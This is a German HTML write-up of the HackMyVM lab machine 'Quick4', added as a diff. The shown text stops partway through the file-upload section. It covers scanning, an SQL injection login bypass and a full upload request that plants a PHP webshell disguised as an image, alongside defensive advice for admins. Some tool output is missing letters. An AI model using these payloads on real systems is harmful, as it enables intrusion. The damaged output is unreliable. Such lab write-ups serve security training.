@@ -1,0 +1,1302 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick4 - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Quick4 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl (implied)</div>
+                <div class="tool-item">Burp Suite (implied)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">mysql client</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-scanning">Port Scanning</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#sqli">SQL Injection & Employee Access</a></li>
+                <li><a href="#file-upload">File Upload Vulnerability</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept (Initial Access - RCE via Upload)</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation & Credential Discovery</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Cronjob Wildcard Injection)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - Wildcard Injection)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Erkundung startet mit einem ARP-Scan, um aktive Geräte im lokalen Netzwerksegment zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan ist erfolgreich und identifiziert die Ziel-IP `192.168.2.125`. Die MAC-Adresse `08:00:27:aa:84:13` weist auf eine Oracle VirtualBox VM hin. Ein guter Startpunkt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die IP und die VM-Information. Fahre mit Port-Scans auf die Ziel-IP fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit einschränken. Überwache auf ungewöhnliche ARP-Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span>
+                    </div>
+                    <pre>
+192.168.2.125	08:00:27:aa:84:13	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird editiert (`vi`), um der IP-Adresse `192.168.2.125` den Hostnamen `quick4.hmv` zuzuordnen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine gängige und notwendige Maßnahme, um Webserver korrekt anzusprechen, falls diese auf Hostnamen basierende Konfigurationen (Virtual Hosts) verwenden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende den Hostnamen `quick4.hmv` für nachfolgende Web-Scans und -Interaktionen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sorgen Sie für eine konsistente und sichere DNS-Auflösung im Netzwerk.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi /etc/hosts</span>
+                     </div>
+                     <pre>
+# Inhalt der /etc/hosts nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.125   quick4.hmv
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="port-scanning">
+            <h2>Port Scanning</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein schneller Nmap TCP SYN Scan (`-sS`) mit Versionserkennung (`-sV`), Aggressivem Scan (`-A`), schnellem Timing (`-T5`) über alle Ports (`-p-`) wird durchgeführt. Die Ausgabe wird gefiltert (`grep open`), um nur offene Ports anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert zwei offene TCP-Ports:
+                *   `22/tcp (SSH)`: OpenSSH 8.9p1 (Ubuntu).
+                *   `80/tcp (HTTP)`: Apache httpd 2.4.52 (Ubuntu).
+                Dies definiert die primäre Angriffsfläche.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche beide Dienste. Priorität hat oft der Webserver (Port 80). Prüfe SSH auf bekannte Schwachstellen oder Standard-Credentials.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass beide Dienste aktuell gepatcht und sicher konfiguriert sind. Schränken Sie den Zugriff per Firewall auf notwendige Quell-IPs ein.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.125 -p- | grep open</span>
+                     </div>
+                     <pre>
+ 22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der gleiche Nmap-Scan wird erneut ausgeführt, diesmal mit vollständiger Ausgabe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Detailausgabe liefert zusätzliche Informationen:
+                *   **SSH (22):** Zeigt die Host-Keys (ECDSA, ED25519).
+                *   **HTTP (80):** Apache 2.4.52 (Ubuntu). Der Seitentitel ist "Quick Automative - Home". Wichtig: Das Nmap-Skript `http-robots.txt` findet einen `Disallow`-Eintrag für `/admin/`.
+                *   **OS:** Wird als Ubuntu Linux erkannt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere den `/admin/`-Pfad aus `robots.txt` als potenzielles Ziel. Untersuche die Webseite auf Port 80. Prüfe OpenSSH 8.9p1 auf Schwachstellen (z.B. CVE-2023-38408, auch wenn Patches wahrscheinlich sind).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verlassen Sie sich nicht auf `robots.txt` zur Absicherung von Verzeichnissen; verwenden Sie stattdessen .htaccess oder Server-Konfigurationen. Halten Sie Apache und OpenSSH aktuell.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.125 -p-</span>
+                     </div>
+                     <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 22:59 CEST
+ Nmap scan report for quick4.hmv (192.168.2.125)
+ Host is up (0.00013s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PRT   STATE SERVICE VERSIN
+ 22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
+ |_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+ | http-robots.txt: 1 disallowed entry
+ |_/admin/
+ |_http-title: Quick Automative - Home
+ |_http-server-header: Apache/2.4.52 (Ubuntu)
+ MAC Address: 08:00:27:AA:84:13 (racle VirtualBox virtual NIC)
+ Aggressive S guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.5 (96%), Linux 5.0 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.4 (94%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.3 - 5.4 (93%), Linux 3.4 - 3.10 (93%)
+ No exact S matches for host (test conditions non-ideal).
+ Network Distance: 1 hop
+ Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ TRACERUTE
+ HP RTT     ADDRESS
+ 1   0.13 ms quick4.hmv (192.168.2.125)
+
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird auf den Webserver (Port 80) ausgeführt, um nach bekannten Schwachstellen und Konfigurationsproblemen zu suchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto liefert ähnliche Ergebnisse wie bei früheren Maschinen:
+                *   **Server:** Bestätigt Apache/2.4.52 (Ubuntu) und meldet ihn als veraltet.
+                *   **Fehlende Header:** `X-Frame-Options` und `X-Content-Type-Options`.
+                *   **robots.txt:** Erwähnt den Eintrag (Disallow: /admin/).
+                *   **IP/ETag Leaks:** Meldet die bekannten, geringfügigen Informationslecks.
+                *   **TRACE-Methode:** Nicht explizit erwähnt, aber `PTINS`-Methode wird gelistet (Nikto-Eigenheit).
+                *   **Directory Indexing:** Wird für `/css/` und `/images/` gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigt die Notwendigkeit, Apache zu untersuchen. Nutzen Sie das Directory Indexing, um Inhalte von `/css` und `/images` zu prüfen. Notieren Sie die anderen Findings.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Apache aktualisieren.** Header implementieren. Directory Indexing deaktivieren (`Options -Indexes`). ETag/IP-Leaks beheben. TRACE-Methode prüfen und ggf. deaktivieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nikto -h http://192.168.2.125</span>
+                     </div>
+                     <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.125
+ + Target Hostname:    192.168.2.125
+ + Target Port:        80
+ + Start Time:         2024-05-11 22:59:40 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.52 (Ubuntu)
+ + /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
+ + /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + No CGI Directories found (use '-C all' to force check all possible dirs)
+ + /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ + /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ + /: Server may leak inodes via ETags, header found with file /, inode: c8d6, size: 6103122781180, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ + Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ + PTINS: Allowed HTTP Methods: GET, PST, PTINS, HEAD .
+ + /css/: Directory indexing found.
+ + /css/: This might be interesting.
+ + /images/: Directory indexing found.
+ + 8103 requests: 0 error(s) and 8 item(s) reported on remote host
+ + End Time:           2024-05-11 22:59:52 (GMT2) (12 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird für einen umfassenden Verzeichnis- und Dateiscan auf Port 80 verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet eine Reihe von Verzeichnissen und Dateien, die typisch für eine Webanwendung sind: `/images/`, `/index.html`, `/img/`, `/modules/`, `/careers/`, `/css/`, `/lib/`, `/js/`, `/customer/`, `/404.html`, `/robots.txt`, `/fonts/`. Die Verzeichnisse `/careers/` und `/customer/` sind neben `/admin/` (aus robots.txt) die interessantesten neuen Funde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Verzeichnisse `/customer/` und `/careers/` sowie den bereits bekannten `/admin/`-Pfad (trotz "Not Found"). Analysiere den Inhalt von `robots.txt`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Webverzeichnisse und -dateien nur die notwendigen Berechtigungen haben und keine sensiblen Informationen enthalten.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.125  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                     </div>
+                     <pre>
+ http://192.168.2.125/images               (Status: 301) [Size: 315] [--> http://192.168.2.125/images/]
+ http://192.168.2.125/index.html           (Status: 200) [Size: 51414]
+ http://192.168.2.125/img                  (Status: 301) [Size: 312] [--> http://192.168.2.125/img/]
+ http://192.168.2.125/modules              (Status: 301) [Size: 316] [--> http://192.168.2.125/modules/]
+ http://192.168.2.125/careers              (Status: 301) [Size: 316] [--> http://192.168.2.125/careers/]
+ http://192.168.2.125/css                  (Status: 301) [Size: 312] [--> http://192.168.2.125/css/]
+ http://192.168.2.125/lib                  (Status: 301) [Size: 312] [--> http://192.168.2.125/lib/]
+ http://192.168.2.125/js                   (Status: 301) [Size: 311] [--> http://192.168.2.125/js/]
+ http://192.168.2.125/customer             (Status: 301) [Size: 317] [--> http://192.168.2.125/customer/]
+ http://192.168.2.125/404.html             (Status: 200) [Size: 5014]
+ http://192.168.2.125/robots.txt           (Status: 200) [Size: 32]
+ http://192.168.2.125/fonts                (Status: 301) [Size: 314] [--> http://192.168.2.125/fonts/]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Informationen, die durch manuelles Browsen der Webseite (`http://192.168.2.125/`) gesammelt wurden. Es werden Kontakt-E-Mail-Adressen und Namen von Teammitgliedern aufgelistet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Liefert weitere potenzielle Benutzernamen und E-Mail-Adressen für verschiedene Abteilungen (`book`, `info`, `tech`) und spezifische Mitarbeiter (`Andrew Speed`, `Jeff Anderson`, `Lee Ka-shing`, `Coos Busters`, `Lara Johnson`, `Mike Cooper`, `John Smith`, `Juan Mecánico`). Diese Liste ist wertvoll für Brute-Force- oder Passwort-Spraying-Angriffe auf SSH oder Web-Logins.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Füge diese Namen und E-Mail-Präfixe zur Liste potenzieller Benutzernamen hinzu.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, welche Informationen auf der Webseite preisgegeben werden. Verwenden Sie generische Kontaktadressen statt direkter Mitarbeiter-E-Mails, wenn möglich. Schulen Sie Mitarbeiter bezüglich Phishing.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Informationen von http://192.168.2.125/
+
+ // Booking //
+ book@quick.hmv
+ // General //
+ info@quick.hmv
+ // Technical //
+ tech@quick.hmv
+
+ // Our Team //
+ Our Experts
+ Andrew Speed
+ CEO
+ Jeff Anderson
+ CFO
+ Lee Ka-shing
+ Sales
+ Coos Busters
+ Sales
+ Lara Johnson
+ Receptionist
+ Mike Cooper
+ Car mechanic
+ John Smith
+ Car mechanic
+ Juan Mecánico
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt von `robots.txt` wird angezeigt. Anschließend wird versucht, auf `/admin/` zuzugreifen, was zu "PAGE NOT FOUND" führt. Es wird auch eine Fehlermeldung "Invalid email or password" erwähnt, die vermutlich von einem anderen Login-Versuch stammt (z.B. im `/customer` oder `/employee` Bereich).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `robots.txt` verbietet `/admin/`. Der fehlgeschlagene Zugriff bestätigt, dass dieser Pfad entweder nicht existiert oder geschützt ist. Die "Invalid email or password"-Meldung deutet auf ein funktionierendes Login-Formular an anderer Stelle hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignoriere `/admin/` vorerst. Konzentriere dich auf andere gefundene Bereiche wie `/customer/` oder suche nach `/employee/`. Teste gefundene Logins mit den gesammelten Benutzernamen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie `robots.txt` nicht zur Sicherheit. Schützen Sie administrative Bereiche mit starker Authentifizierung und Zugriffskontrolle. Geben Sie generische Fehlermeldungen bei Login-Fehlern aus.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Inhalt von http://192.168.2.125/robots.txt
+ User-agent: *
+ Disallow: /admin/
+
+ # Ergebnis des Zugriffs auf http://192.168.2.125/admin/
+ PAGE NOT FOUND
+
+ # Fehlermeldung von einem anderen Login-Versuch
+ Invalid email or password
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Verzeichnis-/Dateiscan (vermutlich `gobuster` oder `dirsearch`) wird gezielt auf das Verzeichnis `/customer/` ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet mehrere PHP-Dateien innerhalb von `/customer/`: `index.php`, `contact.php`, `login.php` (Status 500 - Internal Server Error), `user.php`, `cars.php`, `logout.php`, `config.php` (Status 200, Size 0), `dashboard.php`, `remove.php`. Außerdem werden Standardverzeichnisse (`images`, `modules`, `css`, `js`, `fonts`) und `script.js` gefunden.
+                *   `login.php` mit Status 500 ist verdächtig.
+                *   `config.php` mit Größe 0 ist enttäuschend, normalerweise ein guter Fundort für Credentials.
+                *   Die Existenz von `dashboard.php`, `user.php`, `cars.php` deutet auf eine Kundenportal-Funktionalität hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche `login.php` genauer (warum 500?). Prüfe `contact.php` und andere zugängliche PHP-Dateien auf Schwachstellen (LFI, RFI, XSS, SQLi). Auch wenn `config.php` leer ist, könnte sie in anderen Skripten inkludiert werden. Suche nach einem anderen Admin-Bereich (z.B. `/employee/`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie den 500-Fehler auf `login.php`. Stellen Sie sicher, dass alle PHP-Skripte sicher sind (Input-Validierung, Output-Encoding, keine Schwachstellen). Sichern Sie Konfigurationsdateien angemessen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Scan-Ergebnisse für http://192.168.2.125/customer/
+ http://192.168.2.125/customer/index.php            (Status: 200) [Size: 2172]
+ http://192.168.2.125/customer/images               (Status: 301) [Size: 324] [--> http://192.168.2.125/customer/images/]
+ http://192.168.2.125/customer/contact.php          (Status: 302) [Size: 35199] [--> index.php]
+ http://192.168.2.125/customer/login.php            (Status: 500) [Size: 0]
+ http://192.168.2.125/customer/user.php             (Status: 302) [Size: 17047] [--> index.php]
+ http://192.168.2.125/customer/modules              (Status: 301) [Size: 325] [--> http://192.168.2.125/customer/modules/]
+ http://192.168.2.125/customer/css                  (Status: 301) [Size: 321] [--> http://192.168.2.125/customer/css/]
+ http://192.168.2.125/customer/cars.php             (Status: 302) [Size: 18015] [--> index.php]
+ http://192.168.2.125/customer/js                   (Status: 301) [Size: 320] [--> http://192.168.2.125/customer/js/]
+ http://192.168.2.125/customer/logout.php           (Status: 302) [Size: 0] [--> index.php]
+ http://192.168.2.125/customer/config.php           (Status: 200) [Size: 0]
+ http://192.168.2.125/customer/script.js            (Status: 200) [Size: 372]
+ http://192.168.2.125/customer/fonts                (Status: 301) [Size: 323] [--> http://192.168.2.125/customer/fonts/] <!-- Korrigiert -->
+ http://192.168.2.125/customer/dashboard.php        (Status: 302) [Size: 9098] [--> index.php]
+ http://192.168.2.125/customer/remove.php           (Status: 302) [Size: 0] [--> cars.php]
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="sqli">
+            <h2>SQL Injection & Employee Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird auf `/employee/admin.php` zugegriffen (wahrscheinlich durch Raten oder weitere Scans gefunden). Die E-Mail `info@quick.hmv` (von der Startseite) und der SQL-Injection-Payload `' OR 1=1 -- -` werden erwähnt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies deutet stark auf eine erfolgreiche SQL-Injection im Login-Formular von `/employee/admin.php` hin. Durch Eingabe einer gültigen E-Mail (oder eines beliebigen Benutzernamens) und des Payloads im Passwortfeld konnte die Authentifizierung umgangen werden, da die SQL-Abfrage vermutlich so manipuliert wurde, dass sie immer wahr ist (`OR 1=1`). Der Zugriff auf den Mitarbeiterbereich (`/employee/`) wurde erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätige die SQLi mit Tools wie `sqlmap`. Nutze die SQLi, um die Datenbankstruktur zu enumerieren, Tabellen (insbesondere Benutzer/Passwörter) zu dumpen und potenziell eine Webshell über Datenbankfunktionen zu erhalten (z.B. `INTO OUTFILE`). Erkunde den `/employee/`-Bereich nach weiteren Funktionen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Beheben Sie die SQL-Injection-Schwachstelle sofort!** Verwenden Sie ausschließlich Prepared Statements (parametrisierte Abfragen) für alle Datenbankinteraktionen. Sanitisieren Sie alle Benutzereingaben serverseitig. Führen Sie regelmäßige Code-Audits durch.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Zugriff auf /employee/admin.php (vermutlich)
+ # Versuchter Login mit:
+ Email: info@quick.hmv
+ Passwort: ' OR 1=1 -- -
+
+ # Ergebnis: Erfolgreicher Login / Zugriff auf Mitarbeiterbereich
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Login in den Mitarbeiterbereich (vermutlich durch SQLi) werden die Seiten `/employee/insert_employee.php` und `/employee/manageemployees.php` entdeckt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Seiten deuten auf Funktionen zum Hinzufügen und Verwalten von Mitarbeitern hin. Insbesondere die `manageemployees.php`-Seite könnte interessant sein, da sie oft Funktionen wie das Bearbeiten von Profilen oder das Hochladen von Profilbildern enthält.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche `manageemployees.php` auf eine Upload-Funktion für Profilbilder oder andere Dateien.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Funktionen im Mitarbeiterbereich ordnungsgemäß authentifiziert und autorisiert sind und keine weiteren Schwachstellen enthalten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Gefundene Seiten im Mitarbeiterbereich:
+ http://192.168.2.125/employee/insert_employee.php
+ http://192.168.2.125/employee/manageemployees.php
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="file-upload">
+            <h2>File Upload Vulnerability</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Eine POST-Anfrage an `/employee/manageemployees.php` wird gezeigt, vermutlich abgefangen mit Burp Suite. Die Anfrage enthält Formulardaten (`multipart/form-data`) zum Hochladen eines Fotos (`name="fileToUpload"`) für einen Benutzer (`user_id=3`). Entscheidend ist, dass als Dateiname `rev.php` angegeben wird, der Content-Type auf `image/jpeg` gesetzt ist und der Dateiinhalt mit `GIF89a` beginnt, gefolgt von PHP-Code (`<?php system($GET["cmd"]); ?>`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies zeigt eine klassische Umgehung eines unsicheren Dateiupload-Filters:
+                1.  Der Filter prüft wahrscheinlich nur den `Content-Type`-Header (`image/jpeg`), der hier manipuliert wird.
+                2.  Möglicherweise wird auch der Dateianfang auf Magic Bytes geprüft (`GIF89a`), weshalb diese hinzugefügt wurden.
+                3.  Die Dateiendung (`.php` in `filename="rev.php"`) wird anscheinend nicht ausreichend validiert oder kann manipuliert werden.
+                Das Ergebnis ist der erfolgreiche Upload einer PHP-Webshell, getarnt als Bild.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Finde den Speicherort der hochgeladenen Datei (oft in einem `/uploads/`-Verzeichnis, möglicherweise mit der `user_id` im Namen) und rufe sie über den Browser auf, um die Webshell auszuführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie eine sichere Upload-Validierung, die serverseitig die Dateiendung (Whitelist!), den MIME-Typ (aus dem Inhalt, nicht nur dem Header) und idealerweise den Dateiinhalt selbst prüft. Verhindern Sie das Ausführen von Skripten im Upload-Verzeichnis. Speichern Sie Uploads idealerweise außerhalb des Web-Roots und/oder mit zufälligen Namen ohne die ursprüngliche Endung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Abgefangene POST-Anfrage (z.B. mit Burp Suite)
+
+ PST /employee/manageemployees.php HTTP/1.1
+ Host: 192.168.2.125
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+ Accept-Language: de,en-US;q=0.7,en;q=0.3
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: multipart/form-data; boundary=---------------------------64702681437563696413122058420
+ Content-Length: 498
+ rigin: http://192.168.2.125
+ Connection: close
+ Referer: http://192.168.2.125/employee/manageemployees.php
+ Cookie: PHPSESSID=66h3ddnu30l095bf4oqgslgvi6
+ Upgrade-Insecure-Requests: 1
+
+ -----------------------------64702681437563696413122058420
+ Content-Disposition: form-data; name="user_id"
+
+ 3
+ -----------------------------64702681437563696413122058420
+ Content-Disposition: form-data; name="fileToUpload"; filename="rev.php"
+ Content-Type: image/jpeg
+
+ GIF89a
+ <?php system($GET["cmd"]); ?>
+
+ -----------------------------64702681437563696413122058420   
+ Content-Disposition: form-data; name="submit"
+
+ Upload Photo
+ -----------------------------64702681437563696413122058420--
+                     </pre> <!-- Maskierung < > ? & -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Ausschnitt des HTML-Codes der Mitarbeiterseite (`manageemployees.php` oder eine ähnliche Seite nach dem Login) wird gezeigt. Er enthält Hinweise auf JavaScript-Dateien, einen Benutzer "Nick Greenhorn" (wahrscheinlich User ID 2) und einen Bildpfad `uploads/2_admin.png`. Es wird auch versucht, auf `/employee/uploads/2_shell.php?cmd=id` zuzugreifen, was zu "PAGE NOT FOUND" führt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der HTML-Code bestätigt das Upload-Verzeichnis (`uploads/`) innerhalb des `/employee/`-Pfades und das Namensschema (`{user_id}_{original_filename}`). Der fehlgeschlagene Zugriff auf `2_shell.php` deutet darauf hin, dass die hochgeladene Datei möglicherweise umbenannt wurde oder die Endung geändert wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche verschiedene Namenskombinationen basierend auf dem Schema und der hochgeladenen Datei. Da die Datei als `.jpeg` hochgeladen wurde, versuche Pfade wie `/employee/uploads/3_rev.jpeg` (da user_id 3 verwendet wurde) oder `/employee/uploads/2_rev.jpeg` (falls der User ID geändert wurde oder es User ID 2 betraf). Teste auch auf doppelte Endungen wie `.jpeg.php`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie eine sichere Dateiumbenennung beim Upload (z.B. mit zufälligen Namen oder Hashes) und speichern Sie den ursprünglichen Namen separat, falls benötigt. Verhindern Sie das direkte Browsen von Upload-Verzeichnissen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # HTML-Ausschnitt aus dem Mitarbeiter-Portal
+
+ <!-- ... -->
+ <script src="js/chart_custom_style1.js"></script>
+ <script src="js/custom.js"></script>
+ <!-- ... -->
